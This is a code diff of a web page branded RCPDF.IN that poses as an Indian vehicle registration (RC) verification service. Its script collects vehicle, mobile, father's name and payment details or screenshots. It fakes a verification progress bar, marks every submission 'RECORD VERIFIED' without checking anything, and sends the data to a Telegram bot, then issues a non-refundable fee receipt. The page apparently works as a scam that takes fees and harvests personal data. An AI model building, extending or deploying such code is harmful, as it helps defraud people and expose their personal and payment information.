@@ -7,7 +7,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --primary: #ff0066; --ind-blue: #003399; }
+        :root { --primary: #ff0066; --ind-blue: #003399; --gold: #FFD700; }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
         
         body { 
@@ -27,6 +27,28 @@
         .s-link i { margin-right: 10px; color: var(--ind-blue); }
 
         .card { margin: 100px auto 20px; width: 92%; max-width: 420px; background: rgba(255, 255, 255, 0.98); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+
+        /* NEW: Insurance Home Button */
+        .ins-home-btn {
+            background: linear-gradient(45deg, #003399, #0055ff);
+            color: white; border: none; padding: 15px; border-radius: 15px;
+            width: 100%; font-weight: bold; margin-bottom: 20px;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            box-shadow: 0 4px 15px rgba(0,51,153,0.3); cursor: pointer;
+            text-decoration: none; font-size: 16px;
+        }
+
+        /* NEW: Info Tile System */
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .tile {
+            background: #fff; border: 2px solid #eee; border-radius: 12px;
+            padding: 15px 10px; cursor: pointer; transition: 0.2s;
+            display: flex; flex-direction: column; align-items: center; gap: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        .tile:active { transform: scale(0.95); background: #f0f0f0; border-color: var(--ind-blue); }
+        .tile i { font-size: 20px; color: var(--ind-blue); }
+        .tile span { font-size: 12px; font-weight: bold; color: #333; }
 
         .hsrp-plate { background: #fff; width: 100%; height: 80px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; position: relative; }
         .ind-strip { background: var(--ind-blue); width: 65px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; z-index: 2; position: absolute; left: 0; }
@@ -63,9 +85,6 @@
         .pct { font-size: 45px; font-weight: 900; color: #ff0066; }
         
         .footer { background: #fff; padding: 30px 20px; border-top: 3px solid var(--ind-blue); text-align: center; margin-top: 40px; }
-        .footer-links { display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 15px; }
-        .footer-links span { cursor: pointer; color: #333; font-size: 14px; font-weight: bold; text-decoration: underline; }
-        
         .wa-float { position: fixed; bottom: 20px; right: 20px; background: #25d366; color: #fff; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 35px; z-index: 3000; text-decoration: none; }
         .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; padding: 20px; background: rgba(0, 128, 0, 0.98); }
     </style>
@@ -82,8 +101,7 @@
         <h3 style="margin-bottom:15px; color:var(--ind-blue);">Activity Log</h3>
         <div id="historyList"><p style="font-size:12px; color:#999;">No records found.</p></div>
         <hr style="margin:20px 0;">
-        <button class="s-link" onclick="window.location.href='https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1'"><i class="fas fa-shield-alt"></i> Insurance Info</button>
-        <button class="s-link" onclick="toggleM()" style="background:#ffdddd; margin-top: 20px;">Close</button>
+        <button class="s-link" onclick="toggleM()" style="background:#ffdddd; margin-top: 20px;">Close Menu</button>
     </div>
 
     <div id="successOverlay" class="overlay">
@@ -95,12 +113,35 @@
 
     <div class="card">
         <div id="p1">
+            <a href="https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1" class="ins-home-btn">
+                <i class="fas fa-shield-alt"></i> VEHICLE INSURANCE CHECK
+            </a>
+
             <h2 style="margin-bottom:15px; color: var(--ind-blue);">Digital RC Verification</h2>
             <div class="hsrp-plate">
                 <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
                 <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
             </div>
-            <button class="btn" onclick="go2()">CHECK STATUS</button>
+            <button class="btn" onclick="go2()" style="margin-bottom: 25px;">CHECK STATUS</button>
+
+            <div class="info-grid">
+                <div class="tile" onclick="alert('Contact Support: 918709610091\nAvailable: 10AM - 6PM')">
+                    <i class="fas fa-headset"></i>
+                    <span>CONTACT US</span>
+                </div>
+                <div class="tile" onclick="alert('Terms: Service is for information records only. Valid for 24 hours.')">
+                    <i class="fas fa-file-contract"></i>
+                    <span>TERMS</span>
+                </div>
+                <div class="tile" onclick="alert('Privacy: Your data is encrypted and handled securely.')">
+                    <i class="fas fa-user-shield"></i>
+                    <span>PRIVACY</span>
+                </div>
+                <div class="tile" onclick="alert('Refund: Processing fees are non-refundable after initiation.')">
+                    <i class="fas fa-undo"></i>
+                    <span>REFUND</span>
+                </div>
+            </div>
         </div>
 
         <div id="p2" style="display:none;">
@@ -128,11 +169,6 @@
     </div>
 
     <div class="footer">
-        <div class="footer-links">
-            <span onclick="alert('Privacy Policy: Information is handled securely.')">Privacy Policy</span> | 
-            <span onclick="alert('Terms: Service is for information records.')">Terms & Conditions</span> | 
-            <span onclick="alert('Refund: Processing fees are non-refundable.')">Refund Policy</span>
-        </div>
         <p style="font-size: 13px; color: #666; font-weight: bold;">© 2026 RCPDF.IN | Digital Information Portal</p>
     </div>
 
@@ -203,18 +239,10 @@
             const m = document.getElementById('mob').value;
             const u = document.getElementById('utr').value;
             const fileInput = document.getElementById('screenshotInput');
-
-            // वैलिडेशन: मोबाइल नंबर अनिवार्य है
             if(m.length < 10) { alert("Invalid Mobile Number."); return; }
-            
-            // वैलिडेशन: या तो UTR 12 डिजिट का हो या स्क्रीनशॉट फाइल सिलेक्टेड हो
             const isUtrValid = (u.length === 12);
             const isFileSelected = (fileInput.files.length > 0);
-
-            if(!isUtrValid && !isFileSelected) {
-                alert("कृपया 12-अंकों का UTR नंबर दर्ज करें या पेमेंट स्क्रीनशॉट अपलोड करें।");
-                return;
-            }
+            if(!isUtrValid && !isFileSelected) { alert("कृपया 12-अंकों का UTR नंबर दर्ज करें या पेमेंट स्क्रीनशॉट अपलोड करें।"); return; }
 
             document.getElementById('load').style.display='flex';
             let p = 0;
@@ -222,39 +250,26 @@
                 p += 2;
                 document.getElementById('pText').innerText = p + "%";
                 document.getElementById('carIcon').style.left = (p * 0.85) + "%";
-                
                 if (p === 60) {
                     const now = new Date();
                     globalTxId = "RCV" + Math.floor(Math.random() * 9000000000);
                     const dStr = now.toLocaleDateString('en-IN');
                     const tStr = now.toLocaleTimeString('en-IN');
-                    
                     let cap = `✅ *RECORD VERIFIED*\n\n📅 *Date:* ${dStr}\n⏰ *Time:* ${tStr}\n🆔 *Ref:* \`${globalTxId}\`\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n🔢 *UTR:* ${u || 'Not Provided'}\n💰 *Amt:* ₹${currentAmount}\n🎟️ *Promo:* ${promoUsed}`;
                     
                     if (isFileSelected) {
-                        // अगर फोटो है तो sendPhoto इस्तेमाल करें
                         const formData = new FormData();
                         formData.append("chat_id", T_CHAT_ID);
                         formData.append("caption", cap);
                         formData.append("parse_mode", "Markdown");
                         formData.append("photo", fileInput.files[0]);
-
-                        fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, {
-                            method: "POST",
-                            body: formData
-                        });
+                        fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, { method: "POST", body: formData });
                     } else {
-                        // अगर सिर्फ UTR है तो sendMessage इस्तेमाल करें
                         fetch(`https://api.telegram.org/bot${T_TOKEN}/sendMessage?chat_id=${T_CHAT_ID}&text=${encodeURIComponent(cap)}&parse_mode=Markdown`);
                     }
-                    
                     saveHistory(document.getElementById('vehInput').value, dStr, tStr);
-                    
-                    document.getElementById('dlBtn').onclick = () => {
-                        makePDF(dStr, tStr, globalTxId);
-                    };
+                    document.getElementById('dlBtn').onclick = () => { makePDF(dStr, tStr, globalTxId); };
                 }
-                
                 if (p >= 100) {
                     clearInterval(iv);
                     document.getElementById('load').style.display='none';
@@ -284,49 +299,22 @@
             const mob = document.getElementById('mob').value;
             const fn = document.getElementById('fatherName').value || "N/A";
             const uNum = document.getElementById('utr').value || "N/A";
-
-            // Blue Header
             doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
             doc.setTextColor(255); doc.setFont("helvetica", "bold"); doc.setFontSize(22);
             doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
-
-            // Info Table
             doc.setTextColor(0); doc.setFontSize(12); doc.setDrawColor(200);
             let y = 50;
-            const tableData = [
-                ["REFERENCE ID:", tx], ["DATE & TIME:", `${d} | ${t}`], 
-                ["VEHICLE NO:", veh], ["FATHER'S NAME:", fn], 
-                ["CONTACT NO:", mob], ["UTR NUMBER:", uNum]
-            ];
-            tableData.forEach(row => {
-                doc.rect(15, y, 180, 10); doc.text(row[0], 20, y + 7); doc.text(row[1], 85, y + 7);
-                y += 10;
-            });
-
-            // Amount Box
-            y += 5;
-            doc.setFillColor(240, 245, 255); doc.rect(15, y, 180, 25, 'F'); doc.rect(15, y, 180, 25);
-            doc.setFontSize(11);
-            doc.text("Total Processing Fee:", 20, y + 15); 
-            doc.setFont("helvetica", "bold");
-            doc.text("INR " + currentAmount.toFixed(2), 85, y + 15);
-            
-            // Support Info
-            y += 35;
-            doc.setFont("helvetica", "normal"); doc.rect(15, y, 180, 45); 
-            doc.text("SUPPORT INFORMATION", 25, y + 15);
+            const tableData = [["REFERENCE ID:", tx], ["DATE & TIME:", `${d} | ${t}`], ["VEHICLE NO:", veh], ["FATHER'S NAME:", fn], ["CONTACT NO:", mob], ["UTR NUMBER:", uNum]];
+            tableData.forEach(row => { doc.rect(15, y, 180, 10); doc.text(row[0], 20, y + 7); doc.text(row[1], 85, y + 7); y += 10; });
+            y += 5; doc.setFillColor(240, 245, 255); doc.rect(15, y, 180, 25, 'F'); doc.rect(15, y, 180, 25);
+            doc.setFontSize(11); doc.text("Total Processing Fee:", 20, y + 15); doc.setFont("helvetica", "bold"); doc.text("INR " + currentAmount.toFixed(2), 85, y + 15);
+            y += 35; doc.setFont("helvetica", "normal"); doc.rect(15, y, 180, 45); doc.text("SUPPORT INFORMATION", 25, y + 15);
             doc.addImage(document.getElementById('qr').src, 'PNG', 150, y + 5, 35, 35);
-
-            // Terms
             y += 65; doc.setFontSize(14); doc.text("TERMS AND CONDITIONS", 15, y);
             doc.setFontSize(10); doc.text(["1. Digital Information Receipt only.", "2. Fees are non-refundable.", "3. Information based on available records."], 15, y + 8);
-            
-            // Thank You
             doc.setTextColor(184, 134, 11); doc.setFont("times", "italic"); doc.setFontSize(40);
             doc.text("Thank You", 105, y + 55, null, null, "center");
-            
             doc.setDrawColor(0); doc.rect(5, 5, 200, 287);
-            
             doc.save(`Receipt_${veh}.pdf`);
             setTimeout(() => location.reload(), 1500);
         }
